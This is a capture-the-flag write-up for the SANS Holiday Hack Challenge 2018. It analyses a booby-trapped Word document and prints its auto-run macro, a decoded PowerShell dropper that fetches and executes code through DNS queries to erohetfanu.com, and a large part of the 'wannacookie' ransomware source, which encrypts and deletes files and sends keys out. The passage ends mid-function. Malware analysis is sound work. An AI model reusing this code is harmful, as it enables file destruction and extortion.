+<p><code>Snort is alerting on all ransomware and only the ransomware!</code></p>
+<h4 id="9-2-identify-the-domain">9-2 : Identify the Domain</h4>
+<p><code>Alabaster gives you a document he suspects downloads the malware. What is the domain name the malware in the document downloads from?</code></p>
+<p>Alabaster supported me to download documents from https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip .
+The password for decompression is <code>elves</code>.</p>
+<p><strong>I do not know what kind of function malware has, so I will analyze from here on a virtual machine or linux machine.</strong></p>
+<pre class="hljs"><code><div>root@kali~/work# wget -q https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip
+
+root@kali~/work# 7z x CHOCOLATE_CHIP_COOKIE_RECIPE.zip
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=ja_JP.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 110699 bytes (109 KiB)
+
+Extracting archive: CHOCOLATE_CHIP_COOKIE_RECIPE.zip
+--
+Path = CHOCOLATE_CHIP_COOKIE_RECIPE.zip
+Type = zip
+Physical Size = 110699
+
+    
+Enter password (will not be echoed):
+Everything is Ok                        
+
+Size:       113540
+Compressed: 110699
+</div></code></pre>
+<p>Use <code>olevba</code> to check macros.</p>
+<pre class="hljs"><code><div>root@kali~/work# olevba CHOCOLATE_CHIP_COOKIE_RECIPE.docm
+olevba 0.51 - http://decalage.info/python/oletools
+Flags        Filename                                                         
+-----------  -----------------------------------------------------------------
+OpX:MASI---- CHOCOLATE_CHIP_COOKIE_RECIPE.docm
+===============================================================================
+FILE: CHOCOLATE_CHIP_COOKIE_RECIPE.docm
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Document_Open()
+Dim cmd As String
+cmd = &quot;powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C &quot;&quot;sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()&quot;&quot; &quot;
+Shell cmd
+End Sub
+
+-------------------------------------------------------------------------------
+VBA MACRO NewMacros.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/NewMacros'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub AutoOpen()
+Dim cmd As String
+cmd = &quot;powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C &quot;&quot;sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()&quot;&quot; &quot;
+Shell cmd
+End Sub
+
++------------+-----------------+-----------------------------------------+
+| Type       | Keyword         | Description                             |
++------------+-----------------+-----------------------------------------+
+| AutoExec   | AutoOpen        | Runs when the Word document is opened   |
+| AutoExec   | Document_Open   | Runs when the Word or Publisher         |
+|            |                 | document is opened                      |
+| Suspicious | Shell           | May run an executable file or a system  |
+|            |                 | command                                 |
+| Suspicious | powershell      | May run PowerShell commands             |
+| Suspicious | ExecutionPolicy | May run PowerShell commands             |
+| Suspicious | New-Object      | May create an OLE object using          |
+|            |                 | PowerShell                              |
+| IOC        | powershell.exe  | Executable file name                    |
++------------+-----------------+-----------------------------------------+
+</div></code></pre>
+<p>One script is found.
+The script expands the original script and executes it on <code>iex</code>.
+Since the original script is deflate compressed and base64 encoded, it is decompressed with the following python code.</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">import</span> zlib
+<span class="hljs-keyword">import</span> base64
+
+enc = <span class="hljs-string">"lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG"</span>
+
+decoded_data = base64.b64decode(enc)
+print(zlib.decompress(decoded_data, <span class="hljs-number">-15</span>))
+</div></code></pre>
+<p>Decompress original code.</p>
+<pre class="hljs"><code><div>root@kali~/work# python 0902_dec.py
+function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = &quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;; $h = &quot;&quot;; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).strings}; iex($(H2A $h | Out-string))
+</div></code></pre>
+<p>To make it easy to read.</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">function</span> H2A(<span class="hljs-variable">$a</span>) {
+    <span class="hljs-variable">$o</span>;
+    <span class="hljs-variable">$a</span> -split <span class="hljs-string">'(..)'</span> | ? { <span class="hljs-variable">$_</span> }  | <span class="hljs-keyword">forEach</span> {
+        [char]([convert]::toint16(<span class="hljs-variable">$_</span>,<span class="hljs-number">16</span>))
+    } | <span class="hljs-keyword">forEach</span> {<span class="hljs-variable">$o</span> = <span class="hljs-variable">$o</span> + <span class="hljs-variable">$_</span>}; <span class="hljs-keyword">return</span> <span class="hljs-variable">$o</span>
+}; 
+<span class="hljs-variable">$f</span> = <span class="hljs-string">"77616E6E61636F6F6B69652E6D696E2E707331"</span>; 
+<span class="hljs-variable">$h</span> = <span class="hljs-string">""</span>; 
+<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name <span class="hljs-string">"<span class="hljs-variable">$f</span>.erohetfanu.com"</span> -Type TXT).strings, <span class="hljs-number">10</span>)-<span class="hljs-number">1</span>)) {
+    <span class="hljs-variable">$h</span> += (Resolve-DnsName -Server erohetfanu.com -Name <span class="hljs-string">"<span class="hljs-variable">$i</span>.<span class="hljs-variable">$f</span>.erohetfanu.com"</span> -Type TXT).strings
+}; 
+iex($(H2A <span class="hljs-variable">$h</span> | <span class="hljs-built_in">Out-string</span>))
+</div></code></pre>
+<p>When I read this script, it makes DNS query to the <code>erohetfanu.com</code> server, the next script is created from that response and executed on <code>iex</code>.</p>
+<p>So <code>CHOCOLATE_CHIP_COOKIE_RECIPE.docm</code> downloaded the malware from <code>erohetfanu.com</code>.</p>
+<h4 id="9-3-stop-the-malware">9-3 : Stop the Malware</h4>
+<p><code>Analyze the full malware source code to find a kill-switch and activate it at the North Pole's domain registrar HoHoHo Daddy. What is the full sentence text that appears on the domain registration success message (bottom sentence)?</code></p>
+<p>To get the next script, delete the iex and execute it.</p>
+<pre class="hljs"><code><div>PS C:\&gt; function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = &quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;; $h = &quot;&quot;; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).strings}; $(H2A $h | Out-string) | Out-File $env:Temp\malware.ps1
+</div></code></pre>
+<p>The next script is saved in malware.ps1.</p>
+<pre class="hljs"><code><div><span class="hljs-variable">$functions</span> = {
+  <span class="hljs-keyword">function</span> e_d_file(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$File</span>, <span class="hljs-variable">$enc_it</span>) {
+    [byte[]]<span class="hljs-variable">$key</span> = <span class="hljs-variable">$key</span>;
+    <span class="hljs-variable">$Suffix</span> = <span class="hljs-string">"`.wannacookie"</span>;
+    [System.Reflection.Assembly]::LoadWithPartialName(<span class="hljs-string">'System.Security.Cryptography'</span>);
+    [System.Int32]<span class="hljs-variable">$KeySize</span> = <span class="hljs-variable">$key</span>.Length*<span class="hljs-number">8</span>;
+    <span class="hljs-variable">$AESP</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-string">'System.Security.Cryptography.AesManaged'</span>;
+    <span class="hljs-variable">$AESP</span>.Mode = [System.Security.Cryptography.CipherMode]::CBC;
+    <span class="hljs-variable">$AESP</span>.BlockSize = <span class="hljs-number">128</span>;
+    <span class="hljs-variable">$AESP</span>.KeySize = <span class="hljs-variable">$KeySize</span>;
+    <span class="hljs-variable">$AESP</span>.Key = <span class="hljs-variable">$key</span>;
+    <span class="hljs-variable">$FileSR</span> = <span class="hljs-built_in">New-Object</span> System.IO.FileStream(<span class="hljs-variable">$File</span>, [System.IO.FileMode]::Open);
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$enc_it</span>) {
+      <span class="hljs-variable">$DestFile</span> = <span class="hljs-variable">$File</span> + <span class="hljs-variable">$Suffix</span>
+    } <span class="hljs-keyword">else</span> {
+      <span class="hljs-variable">$DestFile</span> = (<span class="hljs-variable">$File</span> <span class="hljs-nomarkup">-replace</span> <span class="hljs-variable">$Suffix</span>)
+    };
+    <span class="hljs-variable">$FileSW</span> = <span class="hljs-built_in">New-Object</span> System.IO.FileStream(<span class="hljs-variable">$DestFile</span>, [System.IO.FileMode]::Create);
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$enc_it</span>) {
+      <span class="hljs-variable">$AESP</span>.GenerateIV();
+      <span class="hljs-variable">$FileSW</span>.Write([System.BitConverter]::GetBytes(<span class="hljs-variable">$AESP</span>.IV.Length), <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);
+      <span class="hljs-variable">$FileSW</span>.Write(<span class="hljs-variable">$AESP</span>.IV, <span class="hljs-number">0</span>, <span class="hljs-variable">$AESP</span>.IV.Length);
+      <span class="hljs-variable">$Transform</span> = <span class="hljs-variable">$AESP</span>.CreateEncryptor()
+    } <span class="hljs-keyword">else</span> {
+      [Byte[]]<span class="hljs-variable">$LenIV</span> = <span class="hljs-built_in">New-Object</span> Byte[] <span class="hljs-number">4</span>;
+      <span class="hljs-variable">$FileSR</span>.Seek(<span class="hljs-number">0</span>, [System.IO.SeekOrigin]::<span class="hljs-keyword">Begin</span>) | <span class="hljs-built_in">Out-Null</span>;
+      <span class="hljs-variable">$FileSR</span>.Read(<span class="hljs-variable">$LenIV</span>,  <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) | <span class="hljs-built_in">Out-Null</span>;
+      [Int]<span class="hljs-variable">$LIV</span> = [System.BitConverter]::ToInt32(<span class="hljs-variable">$LenIV</span>,  <span class="hljs-number">0</span>);
+      [Byte[]]<span class="hljs-variable">$IV</span> = <span class="hljs-built_in">New-Object</span> Byte[] <span class="hljs-variable">$LIV</span>;
+      <span class="hljs-variable">$FileSR</span>.Seek(<span class="hljs-number">4</span>, [System.IO.SeekOrigin]::<span class="hljs-keyword">Begin</span>) | <span class="hljs-built_in">Out-Null</span>;
+      <span class="hljs-variable">$FileSR</span>.Read(<span class="hljs-variable">$IV</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$LIV</span>) | <span class="hljs-built_in">Out-Null</span>;
+      <span class="hljs-variable">$AESP</span>.IV = <span class="hljs-variable">$IV</span>;
+      <span class="hljs-variable">$Transform</span> = <span class="hljs-variable">$AESP</span>.CreateDecryptor()
+    };
+    <span class="hljs-variable">$CryptoS</span> = <span class="hljs-built_in">New-Object</span> System.Security.Cryptography.CryptoStream(<span class="hljs-variable">$FileSW</span>, <span class="hljs-variable">$Transform</span>, [System.Security.Cryptography.CryptoStreamMode]::Write);
+    [Int]<span class="hljs-variable">$Count</span> = <span class="hljs-number">0</span>;
+    [Int]<span class="hljs-variable">$BlockSzBts</span> = <span class="hljs-variable">$AESP</span>.BlockSize / <span class="hljs-number">8</span>;
+    [Byte[]]<span class="hljs-variable">$Data</span> = <span class="hljs-built_in">New-Object</span> Byte[] <span class="hljs-variable">$BlockSzBts</span>;
+    <span class="hljs-keyword">Do</span> {
+      <span class="hljs-variable">$Count</span> = <span class="hljs-variable">$FileSR</span>.Read(<span class="hljs-variable">$Data</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$BlockSzBts</span>);
+      <span class="hljs-variable">$CryptoS</span>.Write(<span class="hljs-variable">$Data</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$Count</span>)
+    } <span class="hljs-keyword">While</span> (<span class="hljs-variable">$Count</span> <span class="hljs-nomarkup">-gt</span> <span class="hljs-number">0</span>);
+    <span class="hljs-variable">$CryptoS</span>.FlushFinalBlock();
+    <span class="hljs-variable">$CryptoS</span>.Close();
+    <span class="hljs-variable">$FileSR</span>.Close();
+    <span class="hljs-variable">$FileSW</span>.Close();
+    <span class="hljs-built_in">Clear-variable</span> -Name <span class="hljs-string">"key"</span>;
+    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-variable">$File</span>
+  }
+};
+
+<span class="hljs-keyword">function</span> H2B {
+  <span class="hljs-keyword">param</span>(<span class="hljs-variable">$HX</span>);
+  <span class="hljs-variable">$HX</span> = <span class="hljs-variable">$HX</span> -split <span class="hljs-string">'(..)'</span> | ? { <span class="hljs-variable">$_</span> };
+  <span class="hljs-keyword">ForEach</span> (<span class="hljs-variable">$value</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$HX</span>){[Convert]::ToInt32(<span class="hljs-variable">$value</span>,<span class="hljs-number">16</span>)}
+};
+
+<span class="hljs-keyword">function</span> A2H(){
+  <span class="hljs-keyword">Param</span>(<span class="hljs-variable">$a</span>);
+  <span class="hljs-variable">$c</span> = <span class="hljs-string">''</span>;
+  <span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>.ToCharArray();
+  ;
+  <span class="hljs-keyword">Foreach</span> (<span class="hljs-variable">$element</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$b</span>) {<span class="hljs-variable">$c</span> = <span class="hljs-variable">$c</span> + <span class="hljs-string">" "</span> + [System.String]::Format(<span class="hljs-string">"{0:X}"</span>, [System.Convert]::ToUInt32(<span class="hljs-variable">$element</span>))};
+  <span class="hljs-keyword">return</span> <span class="hljs-variable">$c</span> <span class="hljs-nomarkup">-replace</span> <span class="hljs-string">' '</span>
+};
+
+<span class="hljs-keyword">function</span> H2A() {
+  <span class="hljs-keyword">Param</span>(<span class="hljs-variable">$a</span>);
+  <span class="hljs-variable">$outa</span>;
+  <span class="hljs-variable">$a</span> -split <span class="hljs-string">'(..)'</span> | ? { <span class="hljs-variable">$_</span> }  | <span class="hljs-keyword">forEach</span> {[char]([convert]::toint16(<span class="hljs-variable">$_</span>,<span class="hljs-number">16</span>))} | <span class="hljs-keyword">forEach</span> {<span class="hljs-variable">$outa</span> = <span class="hljs-variable">$outa</span> + <span class="hljs-variable">$_</span>};
+  <span class="hljs-keyword">return</span> <span class="hljs-variable">$outa</span>
+};
+
+<span class="hljs-keyword">function</span> B2H {
+  <span class="hljs-keyword">param</span>(<span class="hljs-variable">$DEC</span>);
+  <span class="hljs-variable">$tmp</span> = <span class="hljs-string">''</span>;
+  <span class="hljs-keyword">ForEach</span> (<span class="hljs-variable">$value</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$DEC</span>){<span class="hljs-variable">$a</span> = <span class="hljs-string">"{0:x}"</span> -f [Int]<span class="hljs-variable">$value</span>;
+  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>.length <span class="hljs-nomarkup">-eq</span> <span class="hljs-number">1</span>){<span class="hljs-variable">$tmp</span> += <span class="hljs-string">'0'</span> + <span class="hljs-variable">$a</span>} <span class="hljs-keyword">else</span> {<span class="hljs-variable">$tmp</span> += <span class="hljs-variable">$a</span>}};
+  <span class="hljs-keyword">return</span> <span class="hljs-variable">$tmp</span>
+};
+
+<span class="hljs-keyword">function</span> ti_rox {
+  <span class="hljs-keyword">param</span>(<span class="hljs-variable">$b1</span>, <span class="hljs-variable">$b2</span>);
+  <span class="hljs-variable">$b1</span> = $(H2B <span class="hljs-variable">$b1</span>);
+  <span class="hljs-variable">$b2</span> = $(H2B <span class="hljs-variable">$b2</span>);
+  <span class="hljs-variable">$cont</span> = <span class="hljs-built_in">New-Object</span> Byte[] <span class="hljs-variable">$b1</span>.count;
+  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$b1</span>.count <span class="hljs-nomarkup">-eq</span> <span class="hljs-variable">$b2</span>.count) {
+    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> <span class="hljs-nomarkup">-lt</span> <span class="hljs-variable">$b1</span>.count ; <span class="hljs-variable">$i</span>++) {
+      <span class="hljs-variable">$cont</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$b1</span>[<span class="hljs-variable">$i</span>] -bxor <span class="hljs-variable">$b2</span>[<span class="hljs-variable">$i</span>]
+    }
+  };
+  <span class="hljs-keyword">return</span> <span class="hljs-variable">$cont</span>
+};
+
+<span class="hljs-keyword">function</span> B2G {
+  <span class="hljs-keyword">param</span>([byte[]]<span class="hljs-variable">$Data</span>);
+  <span class="hljs-keyword">Process</span> {
+    <span class="hljs-variable">$out</span> = [System.IO.MemoryStream]::new();
+    <span class="hljs-variable">$gStream</span> = <span class="hljs-built_in">New-Object</span> System.IO.Compression.GzipStream <span class="hljs-variable">$out</span>, ([IO.Compression.CompressionMode]::Compress);
+    <span class="hljs-variable">$gStream</span>.Write(<span class="hljs-variable">$Data</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$Data</span>.Length);
+    <span class="hljs-variable">$gStream</span>.Close();
+    <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>.ToArray()
+  }
+};
+
+<span class="hljs-keyword">function</span> G2B {
+  <span class="hljs-keyword">param</span>([byte[]]<span class="hljs-variable">$Data</span>);
+  <span class="hljs-keyword">Process</span> {
+    <span class="hljs-variable">$SrcData</span> = <span class="hljs-built_in">New-Object</span> System.IO.MemoryStream( , <span class="hljs-variable">$Data</span> );
+    <span class="hljs-variable">$output</span> = <span class="hljs-built_in">New-Object</span> System.IO.MemoryStream;
+    <span class="hljs-variable">$gStream</span> = <span class="hljs-built_in">New-Object</span> System.IO.Compression.GzipStream <span class="hljs-variable">$SrcData</span>, ([IO.Compression.CompressionMode]::Decompress);
+    <span class="hljs-variable">$gStream</span>.CopyTo( <span class="hljs-variable">$output</span> );
+    <span class="hljs-variable">$gStream</span>.Close();
+    <span class="hljs-variable">$SrcData</span>.Close();
+    [byte[]] <span class="hljs-variable">$byteArr</span> = <span class="hljs-variable">$output</span>.ToArray();
+    <span class="hljs-keyword">return</span> <span class="hljs-variable">$byteArr</span>
+  }
+};
+
+<span class="hljs-keyword">function</span> sh1([String] <span class="hljs-variable">$String</span>) {
+  <span class="hljs-variable">$SB</span> = <span class="hljs-built_in">New-Object</span> System.Text.StringBuilder;
+  [System.Security.Cryptography.HashAlgorithm]::Create(<span class="hljs-string">"SHA1"</span>).ComputeHash([System.Text.Encoding]::UTF8.GetBytes(<span class="hljs-variable">$String</span>))|%{[Void]<span class="hljs-variable">$SB</span>.Append(<span class="hljs-variable">$_</span>.ToString(<span class="hljs-string">"x2"</span>))};
+  <span class="hljs-variable">$SB</span>.ToString()
+};
+
+<span class="hljs-keyword">function</span> p_k_e(<span class="hljs-variable">$key_bytes</span>, [byte[]]<span class="hljs-variable">$pub_bytes</span>){
+  <span class="hljs-variable">$cert</span> = <span class="hljs-built_in">New-Object</span> -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;
+  <span class="hljs-variable">$cert</span>.Import(<span class="hljs-variable">$pub_bytes</span>);
+  <span class="hljs-variable">$encKey</span> = <span class="hljs-variable">$cert</span>.PublicKey.Key.Encrypt(<span class="hljs-variable">$key_bytes</span>, <span class="hljs-literal">$true</span>);
+  <span class="hljs-keyword">return</span> $(B2H <span class="hljs-variable">$encKey</span>)
+};
+
+<span class="hljs-keyword">function</span> e_n_d {
+  <span class="hljs-keyword">param</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$allfiles</span>, <span class="hljs-variable">$make_cookie</span> );
+  <span class="hljs-variable">$tcount</span> = <span class="hljs-number">12</span>;
+  <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$file</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$file</span> <span class="hljs-nomarkup">-lt</span> <span class="hljs-variable">$allfiles</span>.length; <span class="hljs-variable">$file</span>++  ) {
+    <span class="hljs-keyword">while</span> (<span class="hljs-literal">$true</span>) {
+      <span class="hljs-variable">$running</span> = @(<span class="hljs-built_in">Get-Job</span> | <span class="hljs-built_in">Where-Object</span> { <span class="hljs-variable">$_</span>.State <span class="hljs-nomarkup">-eq</span> <span class="hljs-string">'Running'</span> });
+      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$running</span>.Count <span class="hljs-nomarkup">-le</span> <span class="hljs-variable">$tcount</span>) {
+        <span class="hljs-built_in">Start-Job</span>  -ScriptBlock {
+          <span class="hljs-keyword">param</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$File</span>, <span class="hljs-variable">$true_false</span>);
+          <span class="hljs-keyword">try</span>{
+            e_d_file <span class="hljs-variable">$key</span> <span class="hljs-variable">$File</span> <span class="hljs-variable">$true_false</span>
+          } <span class="hljs-keyword">catch</span> {
+            <span class="hljs-variable">$_</span>.Exception.Message | <span class="hljs-built_in">Out-String</span> | <span class="hljs-built_in">Out-File</span> $(<span class="hljs-variable">$env:userprofile</span>+<span class="hljs-string">'\Desktop\ps_log.txt'</span>) -append
+          }
+        } -args <span class="hljs-variable">$key</span>, <span class="hljs-variable">$allfiles</span>[<span class="hljs-variable">$file</span>], <span class="hljs-variable">$make_cookie</span> -InitializationScript <span class="hljs-variable">$functions</span>;
+        <span class="hljs-keyword">break</span>
+      } <span class="hljs-keyword">else</span> {
+        <span class="hljs-built_in">Start-Sleep</span> -m <span class="hljs-number">200</span>;
+        <span class="hljs-keyword">continue</span>
+      }
+    }
+  }
+};
+
+<span class="hljs-keyword">function</span> g_o_dns(<span class="hljs-variable">$f</span>) {
+  <span class="hljs-variable">$h</span> = <span class="hljs-string">''</span>;
+  <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name <span class="hljs-string">"<span class="hljs-variable">$f</span>.erohetfanu.com"</span> -Type TXT).Strings, <span class="hljs-number">10</span>)-<span class="hljs-number">1</span>)) {
+    <span class="hljs-variable">$h</span> += $(Resolve-DnsName -Server erohetfanu.com -Name <span class="hljs-string">"<span class="hljs-variable">$i</span>.<span class="hljs-variable">$f</span>.erohetfanu.com"</span> -Type TXT).Strings
+  };
+  <span class="hljs-keyword">return</span> (H2A <span class="hljs-variable">$h</span>)
+};
+
+<span class="hljs-keyword">function</span> s_2_c(<span class="hljs-variable">$astring</span>, <span class="hljs-variable">$size</span>=<span class="hljs-number">32</span>) {
+  <span class="hljs-variable">$new_arr</span> = @();
+  <span class="hljs-variable">$chunk_index</span>=<span class="hljs-number">0</span>;
+  <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">1</span>..$(<span class="hljs-variable">$astring</span>.length / <span class="hljs-variable">$size</span>)) {<span class="hljs-variable">$new_arr</span> += @(<span class="hljs-variable">$astring</span>.substring(<span class="hljs-variable">$chunk_index</span>,<span class="hljs-variable">$size</span>));
+  <span class="hljs-variable">$chunk_index</span> += <span class="hljs-variable">$size</span>};
+  <span class="hljs-keyword">return</span> <span class="hljs-variable">$new_arr</span>
+};
+
+<span class="hljs-keyword">function</span> snd_k(<span class="hljs-variable">$enc_k</span>) {
+  <span class="hljs-variable">$chunks</span> = (s_2_c <span class="hljs-variable">$enc_k</span> );
+  <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$j</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$chunks</span>) {
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$chunks</span>.IndexOf(<span class="hljs-variable">$j</span>) <span class="hljs-nomarkup">-eq</span> <span class="hljs-number">0</span>) {
+      <span class="hljs-variable">$n_c_id</span> = $(Resolve-DnsName -Server erohetfanu.com -Name <span class="hljs-string">"<span class="hljs-variable">$j</span>.6B6579666F72626F746964.erohetfanu.com"</span> -Type TXT).Strings
+    } <span class="hljs-keyword">else</span> {
+      $(Resolve-DnsName -Server erohetfanu.com -Name <span class="hljs-string">"<span class="hljs-variable">$n_c_id</span>.<span class="hljs-variable">$j</span>.6B6579666F72626F746964.erohetfanu.com"</span> -Type TXT).Strings
+    }
+  };
+  <span class="hljs-keyword">return</span> <span class="hljs-variable">$n_c_id</span>
+};
+
+<span class="hljs-keyword">function</span> wanc {
+  <span class="hljs-variable">$S1</span> = <span class="hljs-string">"1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"</span>;
+  <span class="hljs-keyword">if</span> (<span class="hljs-literal">$null</span> <span class="hljs-nomarkup">-ne</span> ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B <span class="hljs-variable">$S1</span>))) $(Resolve-DnsName -Server erohetfanu.com -Name <span class="hljs-number">6</span>B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction <span class="hljs-number">0</span> -Server <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>))) {<span class="hljs-keyword">return</span>};
+  <span class="hljs-keyword">if</span> ($(netstat -ano | <span class="hljs-built_in">Select-String</span> <span class="hljs-string">"127.0.0.1:8080"</span>).length <span class="hljs-nomarkup">-ne</span> <span class="hljs-number">0</span> -or (<span class="hljs-built_in">Get-WmiObject</span> Win32_ComputerSystem).Domain <span class="hljs-nomarkup">-ne</span> <span class="hljs-string">"KRINGLECASTLE"</span>) {<span class="hljs-keyword">return</span>};
+  <span class="hljs-variable">$p_k</span> = [System.Convert]::FromBase64String($(g_o_dns(<span class="hljs-string">"7365727665722E637274"</span>) ) );
+  <span class="hljs-variable">$b_k</span> = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]<span class="hljs-number">01</span>..[char]<span class="hljs-number">255</span>) + ([char[]]([char]<span class="hljs-number">01</span>..[char]<span class="hljs-number">255</span>)) + <span class="hljs-number">0</span>..<span class="hljs-number">9</span> | sort {<span class="hljs-built_in">Get-Random</span>})[<span class="hljs-number">0</span>..<span class="hljs-number">15</span>] -join <span class="hljs-string">''</span>))  | ? {<span class="hljs-variable">$_</span> <span class="hljs-nomarkup">-ne</span> <span class="hljs-number">0</span>x00});
+  <span class="hljs-variable">$h_k</span> = $(B2H <span class="hljs-variable">$b_k</span>);
+  <span class="hljs-variable">$k_h</span> = $(sh1 <span class="hljs-variable">$h_k</span>);
+  <span class="hljs-variable">$p_k_e_k</span> = (p_k_e <span class="hljs-variable">$b_k</span> <span class="hljs-variable">$p_k</span>).ToString();
+  <span class="hljs-variable">$c_id</span> = (snd_k <span class="hljs-variable">$p_k_e_k</span>);
